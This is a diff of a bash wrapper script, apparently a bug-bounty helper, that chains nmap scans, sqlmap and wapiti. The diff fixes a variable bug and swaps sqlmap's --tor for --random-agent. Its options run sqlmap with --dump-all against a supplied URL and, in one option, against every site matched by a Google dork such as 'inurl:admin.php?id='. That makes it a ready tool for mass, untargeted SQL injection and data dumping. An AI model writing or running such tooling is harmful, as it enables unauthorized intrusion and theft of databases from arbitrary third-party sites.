@@ -34,13 +34,13 @@ sorry=
 map="nmap  -O -sV -oN $pkmb.ports $pkmb"
 $map
 echo "OUTPUT WILL BE SAVE IN DIR $pkmb"| lolcat
-mkdir $pkmb && mv $.txt $pkmb.ports $pkmb
+mkdir $pkmb && mv $pkmb.txt $pkmb.ports $pkmb
 echo "Possible inforamtions about target is done,have a bounty day"|lolcat 
 echo ":),ok bye now."|lolcat
 elif [ $pro -eq 2 ];then
 echo "Enter target //https://pkmb.com/any.php?id=1//" | lolcat
 read imranpussy
-beta="sqlmap -u $imranpussy --tor level 3 --risk 5 --dump-all"
+beta="sqlmap -u $imranpussy --time-sec 5 --random-agent level 3 --risk 3 --dump-all"
 $beta
 echo "                                                "
 echo "If website will be vulnerable data will be dumped at location /root/.local/share/sqlmap/output/" | lolcat
@@ -48,16 +48,15 @@ echo ":),ok bye.|lolcat" | lolcat
 elif [ $pro -eq 3 ];then 
 echo "Enter the dork //inurl:admin.php?id=//" | lolcat 
 read sqld
-mind="sqlmap -g $sqld --tor level 3 --risk 5 --dump-all"
+mind="sqlmap -g $sqld  --time-sec 5 --random-agent level 3 --risk 3 --dump-all"
 $mind
 echo ":),ok bye now." |lolcat
 elif [ $pro -eq 4 ];then
 echo "THIS IF FULLY AUTOMATE AND WILL TAKE FEW MORE TIME, as it will scan each aspects that hunter do manually but you need to confim the vulnerbility founded during scan" | lolcat 
 echo "Enter target //https://website.com//" | lolcat 
 read codex
-mkdir $codex
-4evil="wapiti -u $codex -o $codex"
-$codex
+evil="wapiti -u $codex"
+$evil
 echo ":),ok bye now.|lolcat"
 else 
 echo "TOOL SHUTING DOWN"| lolcat 
